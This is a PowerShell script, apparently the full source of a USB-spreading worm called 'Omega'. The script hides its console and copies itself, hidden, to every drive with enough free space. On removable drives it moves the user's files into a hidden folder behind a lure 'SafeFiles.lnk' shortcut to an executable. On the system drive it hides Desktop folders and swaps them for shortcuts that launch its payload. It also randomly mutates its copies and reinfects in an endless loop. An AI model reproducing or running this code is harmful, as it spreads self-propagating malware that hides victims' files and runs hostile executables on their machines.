$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'                  #This is for making the console close almost the moment its opened
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)



function Mutate ([string]$file){                 #these function, as the name indicates, mutates any given file in trhee posible ways
	$mutation_type = Get-Random -Maximum 4
	if ($mutation_type -eq 0) #These mutation type changes random number of bytes of the file
	{
		while($number_of_mutations -le 5)
		{
			$number_of_mutations = Get-Random -Maximum 500
			$random_bytes = "0x00", "0x01", "0x02", "0x03", "0x04", "0x05", "0x06", "0x07", "0x08", "0x09", "0x0A", "0x0B", "0x0C", "0x0D", "0x0E", "0x0F", "0x10", "0x11", "0x12", "0x13", "0x14", "0x15", "0x16", "0x17", "0x18", "0x19", "0x1A", "0x1B", "0x1C", "0x1D", "0x1E", "0x1F", "0x20", "0x21", "0x22", "0x23", "0x24", "0x25", "0x26", "0x27", "0x28", "0x29", "0x2A", "0x2B", "0x2C", "0x2D", "0x2E", "0x2F", "0x30", "0x31", "0x32", "0x33", "0x34", "0x35", "0x36", "0x37", "0x38", "0x39", "0x3A", "0x3B", "0x3C", "0x3D", "0x3E", "0x3F", "0x40", "0x41", "0x42", "0x43", "0x44", "0x45", "0x46", "0x47", "0x48", "0x49", "0x4A", "0x4B", "0x4C", "0x4D", "0x4E", "0x4F","0x50", "0x51", "0x52", "0x53", "0x54", "0x55", "0x56", "0x57", "0x58", "0x59", "0x5A", "0x5B", "0x5C", "0x5D", "0x5E", "0x5F", "0x60", "0x61", "0x62", "0x63", "0x64", "0x65", "0x66", "0x67", "0x68", "0x69", "0x6A", "0x6B", "0x6C", "0x6D", "0x6E", "0x6F", "0x70", "0x71", "0x72", "0x73", "0x74", "0x75", "0x76", "0x77", "0x78", "0x79", "0x7A", "0x7B", "0x7C", "0x7D", "0x7E", "0x7F"
			$bytes = [System.IO.File]::ReadAllBytes($file);
			$mutation_position = Get-Random -Maximum ($bytes.Count - 1)
			$bytes[$mutation_position] = $random_bytes | Get-Random ;
		}
	[System.IO.File]::WriteAllBytes($file, $bytes);
	
	}
	if ($mutation_type -eq 1) #These mutation type adds a random number o random bytes to the end of the file
	{
		while($number_of_mutations -le 5)
		{
			$number_of_mutations = Get-Random -Maximum 500
			$random_bytes = "0x00" ,"0x01", "0x02", "0x03", "0x04", "0x05", "0x06", "0x07", "0x08", "0x09", "0x0A", "0x0B", "0x0C", "0x0D", "0x0E", "0x0F", "0x10", "0x11", "0x12", "0x13", "0x14", "0x15", "0x16", "0x17", "0x18", "0x19", "0x1A", "0x1B", "0x1C", "0x1D", "0x1E", "0x1F", "0x20", "0x21", "0x22", "0x23", "0x24", "0x25", "0x26", "0x27", "0x28", "0x29", "0x2A", "0x2B", "0x2C", "0x2D", "0x2E", "0x2F", "0x30", "0x31", "0x32", "0x33", "0x34", "0x35", "0x36", "0x37", "0x38", "0x39", "0x3A", "0x3B", "0x3C", "0x3D", "0x3E", "0x3F", "0x40", "0x41", "0x42", "0x43", "0x44", "0x45", "0x46", "0x47", "0x48", "0x49", "0x4A", "0x4B", "0x4C", "0x4D", "0x4E", "0x4F","0x50", "0x51", "0x52", "0x53", "0x54", "0x55", "0x56", "0x57", "0x58", "0x59", "0x5A", "0x5B", "0x5C", "0x5D", "0x5E", "0x5F", "0x60", "0x61", "0x62", "0x63", "0x64", "0x65", "0x66", "0x67", "0x68", "0x69", "0x6A", "0x6B", "0x6C", "0x6D", "0x6E", "0x6F", "0x70", "0x71", "0x72", "0x73", "0x74", "0x75", "0x76", "0x77", "0x78", "0x79", "0x7A", "0x7B", "0x7C", "0x7D", "0x7E", "0x7F"
			$bytes = [System.IO.File]::ReadAllBytes($file);
			$Bytes_Count = Get-Random -Minimum 1 -Maximum 4
			$new_Bytes = $random_bytes | Get-Random -Count $Bytes_Count
			
			$newloc = $file
			[System.IO.File]::WriteAllBytes($file, $bytes + $new_Bytes);
			
		}
	}
	if ($mutation_type -eq 2) #These mutation type eliminates random bytes
	{
		while($number_of_mutations -le 5)
		{
			$number_of_mutations = Get-Random -Maximum 500
			$bytes = [System.IO.File]::ReadAllBytes($file);
			$Bytes_Count = Get-Random -Maximum 3
			$mutation_position = Get-Random -Maximum ($Bytes.Count - 1)
			$first_Bytes = $bytes[0..($mutation_position - 1)]
			$last_Bytes = $bytes[($mutation_position + 1)..$bytes.Count]
			$newloc = $file
			[System.IO.File]::WriteAllBytes($file, $first_Bytes + $last_Bytes);
			
		}
	}
	if ($mutation_type -eq 3) #These mutation type duplicates a random string of bytes and adds it to the end of the file 
	{
		while($number_of_mutations -le 5)
		{
			$number_of_mutations = Get-Random -Maximum 500
			$bytes = [System.IO.File]::ReadAllBytes($file);
			$Bytes_Count = Get-Random -Maximum 3
			$mutation_position = Get-Random -Maximum ($bytes.Count - 1)
			$end_Byte = Get-Random -Minimum ($mutation_position + 1) -Maximum $bytes.Count
			$duplicated_Bytes = $bytes[$mutation_position..$end_Byte]
			
			$newloc = $file
			[System.IO.File]::WriteAllBytes($file, $bytes + $duplicated_Bytes);
			
		}
	}
	
}





	
Function Shortcuts([string]$path){      #These function creates the shortcut SafeFiles.lnk in the portable drive
	$safe_files = ("$path" + "SafeFiles")
	new-item $safe_files -itemtype directory
	$safe_files_item = get-item $safe_files -Force
	$safe_files_item.attributes = "Hidden"
	Get-ChildItem -Path "$path"  -Depth 0 | where {$_.name -ne "SafeFiles.lnk"} | Move-Item -Destination $safe_files

	$Shortcut_loc = "$path" + "SafeFiles.lnk"
	$shortcut_target = "$path" + "Omega\delta.exe"     
	$shortcut_icon = "$path" + "Omega\SafeFiles.ico"      
	$WshShell = New-Object -comObject WScript.Shell
	$Shortcut = $WshShell.CreateShortcut("$Shortcut_loc")
	$Shortcut.TargetPath = "$shortcut_target"
	$shortcut.IconLocation = "$shortcut_icon"
	$shortcut.Save()
	}


Function Search-Troy{                #These function moves and hides the folder of the desktop and leaves shortcuts in their place
	$FullPathToEXE = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
	$loc = [System.IO.Path]::GetDirectoryName($FullPathToEXE)
	         
	cd $loc
	$user = ("$env:USERPROFILE" + "\Desktop")
	[array]$linklist = (get-childitem "$user" -Depth 0 -recurse | where-object {$_.attributes -like "*Directory*"})

	cd..
	$linklist | foreach-object {
		if ($_ -ne $null)
		{
			$a = $_.name
			[string]$loc_new = get-location
			[string]$dest = ($loc_new + "$a")
			new-item "$dest" -itemtype directory    
			robocopy "$loc" $dest "alpha.exe" copyall    
			$name = ("$dest" + "\" + "$a")
			"$name" | Out-File -FilePath "$dest\INFO.txt"
			Move-Item -Path $_.fullname -Destination $dest
			$wsh = New-Object -ComObject Wscript.Shell
			$wsh.sendkeys('{F5}')
			start-sleep 1
			$wsh.sendkeys('{F5}')
			
			
			[string]$fullname = $_.fullname
			$targetpath = ("$dest\alpha.exe")
			$Shortcut_loc = "$fullname.lnk"
			$icon_loc = "$loc\SafeFiles.ico"
			$shell = New-Object -ComObject WScript.Shell
			$shortcut = $shell.CreateShortcut("$Shortcut_loc")
			$shortcut.targetpath = "$targetpath"
			$shortcut.IconLocation = "$icon_loc"
			$shortcut.save()
			
			$folder = Get-Item $dest -Force
			$folder.attributes = "Hidden"
		}
		}



	cd $loc
}






Function Infect([string]$drive){  #these function copies the Omega folder to the drives and mutates some of those files if the conditions are right
	new-item $drive -itemtype directory
	robocopy "$loc" $drive  *.* copyall
	$dir_root_to_hide = Get-Item $drive -Force
	$dir_root_to_hide.attributes = "Hidden"
		 
	$Omega_Files = Get-ChildItem -Path $drive -Recurse
	$Omega_Files2 = Get-Random -Minimum 1 -Maximum ($Omega_Files.length)
	$Files_to_Mutate = $Omega_Files | Get-Random -Count ($Omega_Files2) | foreach-object {$_.fullname}  
	$Files_to_Mutate | foreach-object {if ((Get-Random -Maximum 1000) -le 5) {Mutate -file $_}}
	
}








function Omega(){  #these is the main function, it searches for drives to infect, installs Omega in computers, prevents more than one Omega.exe to be active at the same time, and calls all the other functions that came before. Its al loop function.
	$FullPathToEXE = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
	[string]$loc = [System.IO.Path]::GetDirectoryName($FullPathToEXE)
	
	cd "$loc"
	[array]$ID = Get-Content "ID.txt"
	$loc_property = (Get-ChildItem $loc | Measure-Object -Property Length -sum)
	$search = (get-PSDrive | where-object{($_.free -gt $loc_property.sum)})
	$dir = $search.root
	[array]$dir_root = foreach ($element in $dir)  { $element + "Omega"}
	$dir_root = $dir_root | where-object {"$_" -ne "$loc"}
	
	if ($dir_root -ne $null){
		
		 
		
		$dir_root | foreach-object {
			$ID_path = ("$_" + "\ID.txt")
			cd "$_"
			cd ..
			$SF_loc = get-location
			$SF_lnk = ("$SF_loc" + "SafeFiles.lnk")
			cd "$loc"
 			
			if ((Test-Path -Path "$ID_path"))
			{
				
				[array]$External_ID = Get-Content "$ID_path"
				if ($External_ID -ne $ID)
				{
					
					Remove-Item -LiteralPath "$_" -Force -Recurse
					Infect -drive "$_"
				
					if (-not ($_ -like "C:\*"))
					{
						cd "$_"
						cd..
						$current_loc = get-location
						Shortcuts -path $current_loc
						cd "$loc"
					}
				
				}	
			}
			elseif ((Test-Path -Path "$_") -and (-not (Test-Path -Path "$ID_path")))
			{
				
				Remove-Item -LiteralPath "$_" -Force -Recurse
				Infect -drive "$_"
			
				if (-not ($_ -like "C:\*"))
					{
						cd "$_"
						cd..
						$current_loc = get-location
						Shortcuts -path $current_loc
						cd "$loc"
					}
			}
			else
			{
				Infect -drive "$_"
				
				if (-not ($_ -like "C:\*"))
				{
					cd "$_"
					cd..
					$current_loc = get-location
					Shortcuts -path $current_loc
					cd "$loc"
				}
				
			}
		}	
					
	}
	
	if (($loc -eq "C:\Omega"))
	{
		Search-Troy
		
	}
	else 
	{
		start-process -FilePath C:\Omega\Omega.exe -WindowStyle Hidden
		exit
	}
	
	cd "C:\"
	$process = get-process | where-object {$_.name -eq "Omega"} 
	cd $loc
	start-sleep 30
	if ($process.length -gt 1){exit}   
	
	Omega   

	}
Omega  




















